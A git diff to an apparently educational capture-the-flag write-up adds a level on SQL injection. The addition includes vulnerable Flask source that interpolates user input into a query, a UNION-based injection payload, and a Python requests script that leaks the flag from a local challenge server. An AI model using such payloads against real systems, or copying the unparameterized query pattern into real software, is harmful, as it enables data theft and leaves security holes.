@@ -284,7 +284,7 @@ Unless the credentials are valid this will not get us the flag.
 
 ### SQL Injection
 
-However, we can bypass the using a SQL injection.
+However, since our user input is being directly inserted within the query without any sort of parameterization or binding, we can perform a SQL injection.
 
 #### Login bypass by commnenting out password check
 
@@ -353,5 +353,67 @@ data={
 }
 
 response = requests.post("http://challenge.localhost/", data = data)
+print(response.text)
+```
+
+&nbsp;
+
+## level 5
+
+> Exploit a structured query language injection vulnerability to leak data
+
+```py title="level 5 source code"
+def level5():
+    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
+                'SELECT "flag" AS username, ? AS password'),
+               (flag,))
+
+    query = request.args.get("query", "%")
+    users = db.execute(f'SELECT username FROM users WHERE username LIKE "{query}"').fetchall()
+    return "".join(f'{user["username"]}\n' for user in users)
+```
+
+This level selects usernames from the `users` table where the username matches the `query` parameter.
+
+We can see how our input is inserted into the SQL query.
+
+```
+SELECT username FROM users WHERE username LIKE "flag"
+```
+
+### SQL Injection
+
+However, since our user input is being directly inserted within the query without any sort of parameterization or binding, we can perform a SQL injection.
+
+#### UNION attack
+
+If we provide the following parameter:
+
+```
+query": 'flag" UNION SELECT password FROM users --
+```
+
+The resultant SQL query will be:
+
+```
+SELECT username FROM users WHERE username LIKE "flag" UNION SELECT password FROM users --"
+
+## Queried part:
+SELECT username FROM users WHERE username LIKE "flag" UNION SELECT password FROM users
+
+## Commented part
+"
+```
+
+Since we are using thw UNION operator, the server will list out users with username similar to `flag`, and then list out the password from the `users` table.
+
+```python
+import requests
+
+params={
+	"query": 'flag" UNION SELECT password FROM users --'
+}
+
+response = requests.get("http://challenge.localhost/", params = params)
 print(response.text)
 ```
